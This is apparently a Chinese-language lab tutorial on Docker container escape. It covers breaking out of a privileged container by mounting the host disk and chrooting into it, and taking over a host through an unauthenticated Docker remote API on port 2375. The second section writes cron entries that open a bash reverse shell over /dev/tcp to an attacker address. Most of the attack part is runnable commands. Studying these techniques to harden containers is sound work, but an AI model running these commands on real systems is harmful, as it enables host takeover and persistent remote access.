## ****Privileged特权模式容器逃逸****

### 1\. **环境搭建**

使用 --privileged=true 创建一个容器  

docker run --rm --privileged=true -it alpine

![1684918580_646dd1341895e942b7a14.png!small?1684918580571](https://image.3001.net/images/20230524/1684918580_646dd1341895e942b7a14.png!small?1684918580571)

### 2\. **漏洞检测**

在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是
0000001fffffffff

cat /proc/self/status | grep CapEff

![1684918586_646dd13ad83577e85270c.png!small?1684918587304](https://image.3001.net/images/20230524/1684918586_646dd13ad83577e85270c.png!small?1684918587304)

### 3\. **漏洞复现**

查看挂载磁盘设备

fdisk -l

![1684918592_646dd14049470bdac9214.png!small?1684918592890](https://image.3001.net/images/20230524/1684918592_646dd14049470bdac9214.png!small?1684918592890)

能访问device了逃到宿主机也很简单，先将其挂载到容器中，然后使用chroot获取一个以宿主机根目录为根目录的shell来拿到宿主机的权限。

mkdir /tmp/mnt

mount /dev/sda1 /tmp/mnt

cd /tmp/mnt

chroot ./ bash

reverse shell

![1684918597_646dd145b0f6e19354b01.png!small?1684918598456](https://image.3001.net/images/20230524/1684918597_646dd145b0f6e19354b01.png!small?1684918598456)

  

##  ** **Docker 远程 API 未授权访问逃逸****

docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker

### 1\. **环境搭建**

将 docker 守护进程监听在 0.0.0.0

dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375

![1684918647_646dd177bbb0eeed82e4c.png!small?1684918648340](https://image.3001.net/images/20230524/1684918647_646dd177bbb0eeed82e4c.png!small?1684918648340)

### 2\. **漏洞检测**

curl [http://192.168.159.205:2375/version](http://your-ip:2375/version)  

![1684918652_646dd17c9891ab824a162.png!small?1684918653163](https://image.3001.net/images/20230524/1684918652_646dd17c9891ab824a162.png!small?1684918653163)

### 3\. **漏洞复现**

列出容器信息

curl http://192.168.159.205:2375/containers/json

查看容器

docker -H tcp://192.168.159.205:2375 ps -a

新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下。

docker -H tcp://192.168.159.205:2375 run -it -v /:/mnt nginx:latest /bin/bash

在容器内执行命令，将反弹shell的脚本写入到/var/spool/cron/root

如果靶机是Ubuntu

echo '* * * * * /bin/bash -i >& /dev/tcp/192.168.159.204/12345 0>&1' >>
/mnt/var/spool/cron/crontabs/root

如果靶机是centos

echo '*/1 * * * * root bash -i >& /dev/tcp/192.168.159.204/12345 0>&1' >>
/mnt/var/spool/cron/root

本地监听端口，获取对方宿主机shell。

![1684918673_646dd19135cdba01c377d.png!small?1684918673815](https://image.3001.net/images/20230524/1684918673_646dd19135cdba01c377d.png!small?1684918673815)

  

